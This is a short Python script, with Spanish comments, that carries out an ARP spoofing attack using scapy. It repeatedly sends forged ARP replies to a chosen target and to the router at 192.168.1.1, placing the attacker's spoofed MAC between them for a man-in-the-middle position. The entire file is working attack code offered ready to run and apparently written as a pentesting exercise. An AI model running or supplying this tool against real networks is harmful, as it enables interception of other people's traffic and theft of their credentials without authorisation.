#!/usr/bin/env python3

import argparse
import time
import scapy.all as scapy
from termcolor import colored
import signal
import sys

# Maneja la señal de interrupción (Ctrl+C) para salir de manera limpia
def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

# Se registra el manejador de señal para SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, def_handler)

# Obtiene los argumentos de línea de comando para la dirección IP objetivo
def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range to Spoof")

    return parser.parse_args()

# Función para enviar paquetes ARP spoofeados al objetivo
def spoof(ip_address, spoof_ip):
    # Construye un paquete ARP con 'op=2' para enviar una respuesta ARP
    # 'psrc' es la dirección IP del remitente (la dirección que estamos suplantando)
    # 'pdst' es la dirección IP del destino (la víctima)
    # 'hwsrc' es la dirección MAC del remitente (opcional aquí, para la suplantación)
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66") #Importarnte tener la misma MAC o cambiarla.
    # Envía el paquete ARP sin mostrar salida detallada
    scapy.send(arp_packet, verbose=False)

# Función principal que orquesta el ataque de ARP spoofing
def main():
    arguments = get_arguments()

    while True:
        # Envía un paquete ARP al objetivo, suplantando como si fuera el router
        spoof(arguments.ip_address, "192.168.1.1")  # IP del router
        # Luego envía un paquete ARP al router, suplantando como si fuera el objetivo
        spoof("192.168.1.1", arguments.ip_address)  # IP del objetivo
        
        # Espera 2 segundos para evitar sobrecargar la red
        time.sleep(2)

if __name__ == '__main__':
    main()
